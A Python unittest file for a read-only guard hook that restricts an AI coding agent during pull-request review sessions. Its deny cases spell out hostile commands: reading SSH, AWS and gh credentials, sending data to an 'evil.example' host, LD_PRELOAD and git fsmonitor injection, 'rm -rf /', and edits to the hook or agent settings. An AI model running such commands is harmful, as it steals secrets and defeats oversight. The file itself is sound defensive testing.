import json
import os
import subprocess
import sys
import tempfile
import unittest

HOOK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "review-guard.py")
SID = "110cafae-778b-4ec7-8006-7573681a09f5"
OTHER = "220cafae-778b-4ec7-8006-7573681a09f5"
HOME = os.path.expanduser("~")
CLAUDE = os.environ.get("CLAUDE_CONFIG_DIR") or os.path.join(HOME, ".claude")


class GuardTest(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.index = os.path.join(self.dir.name, "sessions.jsonl")
        with open(self.index, "w", encoding="utf-8") as f:
            f.write(json.dumps({"ts": "2026-11-23T10:00:00Z", "session_id": SID, "cwd": "/w", "skill": "pr-rev",
                                "repo": "zephyrproject-rtos/zephyr", "number": 1}) + "\n")

    def tearDown(self):
        self.dir.cleanup()

    def run_hook(self, tool, tool_input, session=SID, env_review=None, raw=None):
        env = dict(os.environ, PR_SESSION_INDEX=self.index)
        env.pop("CLAUDE_REVIEW_SESSION", None)
        if env_review is not None:
            env["CLAUDE_REVIEW_SESSION"] = env_review
        stdin = raw if raw is not None else json.dumps(
            {"session_id": session, "cwd": "/w", "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input})
        res = subprocess.run([sys.executable, HOOK], input=stdin, text=True, capture_output=True, env=env)
        self.assertEqual(res.returncode, 0, res.stderr)
        if not res.stdout:
            return None
        out = json.loads(res.stdout)["hookSpecificOutput"]
        self.assertEqual(out["permissionDecision"], "deny")
        return out["permissionDecisionReason"]

    def bash(self, command, **kw):
        return self.run_hook("Bash", {"command": command}, **kw)

    def assertAllowed(self, command):
        self.assertIsNone(self.bash(command), command)

    def assertDenied(self, command, reason=""):
        got = self.bash(command)
        self.assertIsNotNone(got, command)
        self.assertIn(reason, got, command)

    def test_other_sessions_are_left_alone(self):
        self.assertIsNone(self.bash("rm -rf /", session=OTHER))
        self.assertIsNone(self.run_hook("Write", {"file_path": "/etc/passwd"}, session=OTHER))

    def test_env_marks_a_review_session(self):
        self.assertIsNotNone(self.bash("west build", session=OTHER, env_review="1"))

    def test_review_commands_pass(self):
        for cmd in [
            "gh pr view 114959 --repo zephyrproject-rtos/zephyr --json title,body,files",
            "gh pr diff 114959 --repo zephyrproject-rtos/zephyr",
            'gh api --paginate "repos/zephyrproject-rtos/zephyr/pulls/114959/comments"',
            "gh api repos/o/r/compare/a...b --jq '.files[] | select(.changes > 3) | .filename'",
            "gh search prs --review-requested=@me",
            "git -C ~/espressif/zephyr/zephyr fetch origin main +pull/114959/head:refs/pr/114959",
            "git fetch origin +refs/pull/1/head:refs/remotes/origin/pr/1",
            "git show refs/pr/114959:drivers/flash/flash_esp32.c | head -50",
            "git log --oneline -20 -- drivers/flash && git diff -u main...refs/pr/5 --stat",
            "git range-diff abc...refs/pr/5",
            "git branch --show-current",
            "git tag -l 'v4*'",
            "git remote -v",
            "git config --get remote.origin.url",
            "grep -rn 'flash_esp32' drivers/ include/ 2>/dev/null | wc -l",
            "rg -n foo src >/dev/null 2>&1; echo done",
            "cat file.c | sed --sandbox -n '10,20p'",
            "awk --sandbox '{ print $1 }' file",
            "find drivers -name '*.c' | xargs grep -l esp32",
            "jq '.[] | select(.line > 10)' comments.json",
            "./scripts/checkpatch.pl --no-tree -f drivers/flash/flash_esp32.c",
            "git format-patch -1 --stdout abc | ./scripts/checkpatch.pl -",
            "cd ~/espressif/zephyr/zephyr && git status",
            "ls -la; pwd",
            f"python3 {CLAUDE}/skills/pr-post/post.py --pr 1 --dry-run",
            "python3 -I ~/.claude/skills/pr-post/post.py send plan.json",
            "git branch -a",
            "git branch --list 'esp*'",
        ]:
            with self.subTest(cmd=cmd):
                self.assertAllowed(cmd)

    def test_writes_and_builds_are_denied(self):
        cases = [
            ("west build -b esp32_devkitc samples/hello_world", "not on the read-only"),
            ("cmake -B build", "not on the read-only"),
            ("rm -rf build", "not on the read-only"),
            ("git checkout main", "changes the tree"),
            ("git -C /w switch -c x", "changes the tree"),
            ("git stash", "changes the tree"),
            ("git reset --hard", "changes the tree"),
            ("git push origin main", "changes the tree"),
            ("git -C /w push origin main", "changes the tree"),
            ("git fetch origin +main:refs/heads/main", "refs/pr/"),
            ("git branch -D topic", "changes the tree"),
            ("git branch newbranch", "changes the tree"),
            ("git tag v1", "changes the tree"),
            ("git tag -a v1 -m x", "changes the tree"),
            ("git format-patch -1 abc", "changes the tree"),
            ("git format-patch --stdout -o /tmp/x abc", "changes the tree"),
            ("git remote add evil https://x", "changes the tree"),
            ("git -c core.fsmonitor=/tmp/x status", "can run commands"),
            ("git fetch --upload-pack=/tmp/x origin", "runs a program"),
            ("git diff --output=/tmp/x", "runs a program or writes"),
            ("git grep -O vim foo", "runs a program or writes"),
            ("echo hi > /tmp/x", "redirection"),
            ("echo hi >> notes.md", "redirection"),
            ("cat a 2> err.txt", "redirection"),
            ("cat a > /dev/null 2>&1; cat b >out", "redirection"),
            ("cat <<EOF\nx\nEOF", "here-documents"),
            ("echo $(cat ~/.ssh/id_rsa)", "command substitution"),
            ("echo `id`", "command substitution"),
            ("(cd /; ls)", "subshells"),
            ("sed -i 's/a/b/' file.c", "--sandbox"),
            ("sed --sandbox -i 's/a/b/' file.c", "writes files"),
            ("sed --sandbox -ni p file.c", "writes files"),
            ("sed 's/x/y/e' file", "--sandbox"),
            ("awk '{ system(\"id\") }' file", "--sandbox"),
            ("find . -name '*.o' -delete", "-delete"),
            ("find . -exec rm {} \\;", "-exec"),
            ("sort -o out.txt in.txt", "writes files"),
            ("rg --pre cat foo", "runs a program"),
            ("xargs rm", "not on the read-only"),
            ("GIT_SSH_COMMAND=x git fetch origin", "environment assignments"),
            ("LD_PRELOAD=/tmp/e.so ls", "environment assignments"),
            ("env", "not on the read-only"),
            ("printenv GH_TOKEN", "not on the read-only"),
            ("bash -c 'ls'", "not on the read-only"),
            ("python3 -c 'import os'", "pr-post script"),
            ("python3 /tmp/evil.py", "pr-post script"),
            ("perl -e 'print 1'", "checkpatch.pl"),
            ("curl https://evil.example/x", "not on the read-only"),
            ("wget https://evil.example/x", "not on the read-only"),
            ("tee out.txt", "not on the read-only"),
            ("esptool erase-flash", "not on the read-only"),
            ("sudo ls", "not on the read-only"),
            ("for f in a b; do echo $f; done", "not on the read-only"),
            ("eval ls", "not on the read-only"),
            ("source ~/.bashrc", "not on the read-only"),
        ]
        for cmd, reason in cases:
            with self.subTest(cmd=cmd):
                self.assertDenied(cmd, reason)

    def test_gh_writes_are_denied(self):
        cases = [
            "gh pr comment 1 --body hi",
            "gh pr review 1 --approve",
            "gh pr merge 1",
            "gh pr checkout 1",
            "gh issue comment 1 --body x",
            "gh api repos/o/r/issues/1/comments -f body=hi",
            "gh api -X POST repos/o/r/pulls/1/reviews",
            "gh api --method PATCH repos/o/r",
            "gh api graphql -f query='mutation { x }'",
            "gh api --input body.json repos/o/r/issues",
            "gh api --hostname evil.example user",
            "gh auth token",
            "gh auth login",
            "gh repo clone o/r",
            "gh release create v1",
            "gh run download 1",
            "gh",
        ]
        for cmd in cases:
            with self.subTest(cmd=cmd):
                self.assertDenied(cmd)

    def test_secret_paths_are_unreadable(self):
        for cmd in [
            "cat ~/.ssh/id_ed25519",
            f"cat {HOME}/.config/gh/hosts.yml",
            "cat $HOME/.netrc",
            "head ~/.claude/.credentials.json",
            "grep token ~/.config/gh/hosts.yml",
            "cat < ~/.aws/credentials",
            "cd ~/.gnupg && ls",
            "git -C ~/.ssh log",
            "cat ~/.claude/settings.json",
        ]:
            with self.subTest(cmd=cmd):
                self.assertDenied(cmd, "credentials or settings")

    def test_file_writes_only_in_the_ledger_tree(self):
        ok = os.path.join(CLAUDE, "reviews", "zephyr-114959.md")
        self.assertIsNone(self.run_hook("Write", {"file_path": ok, "content": "x"}))
        self.assertIsNone(self.run_hook("Edit", {"file_path": "~/.claude/reviews/sub/notes.md", "old_string": "a", "new_string": "b"}))
        self.assertIsNone(self.run_hook("Write", {"file_path": "/var/tmp/claude/x/scratch.txt"}))
        for path in [
            "/w/zephyr/drivers/flash/flash_esp32.c",
            os.path.join(CLAUDE, "CLAUDE.md"),
            os.path.join(CLAUDE, "skills", "pr-rev", "SKILL.md"),
            os.path.join(CLAUDE, "hooks", "review-guard.py"),
            os.path.join(CLAUDE, "settings.json"),
            os.path.join(CLAUDE, "projects", "x", "memory", "MEMORY.md"),
            os.path.join(CLAUDE, "reviews", "..", "CLAUDE.md"),
            os.path.join(HOME, ".bashrc"),
            "",
        ]:
            with self.subTest(path=path):
                self.assertIsNotNone(self.run_hook("Write", {"file_path": path, "content": "x"}))
        self.assertIsNotNone(self.run_hook("NotebookEdit", {"notebook_path": "/w/a.ipynb"}))

    def test_fetch_and_connectors(self):
        self.assertIsNone(self.run_hook("WebFetch", {"url": "https://github.com/zephyrproject-rtos/zephyr/pull/1"}))
        self.assertIsNone(self.run_hook("WebFetch", {"url": "https://docs.zephyrproject.org/latest/x.html"}))
        self.assertIsNotNone(self.run_hook("WebFetch", {"url": "https://evil.example/collect?d=secret"}))
        self.assertIsNotNone(self.run_hook("WebFetch", {"url": "https://github.com.evil.example/x"}))
        self.assertIsNotNone(self.run_hook("mcp__claude_ai_Gmail__send", {"to": "x"}))
        self.assertIsNone(self.run_hook("mcp__other__read", {}))
        self.assertIsNone(self.run_hook("Read", {"file_path": "/w/any"}))
        self.assertIsNone(self.run_hook("WebSearch", {"query": "zephyr"}))

    def test_sandbox_override_is_refused(self):
        self.assertIsNotNone(self.run_hook("Bash", {"command": "ls", "dangerouslyDisableSandbox": True}))

    def test_broken_input_never_fails(self):
        self.assertIsNone(self.run_hook(None, None, raw="not json"))
        self.assertIsNone(self.run_hook(None, None, raw="[1]"))
        self.assertIsNotNone(self.run_hook("Bash", {"command": "echo 'unterminated"}))


if __name__ == "__main__":
    unittest.main()
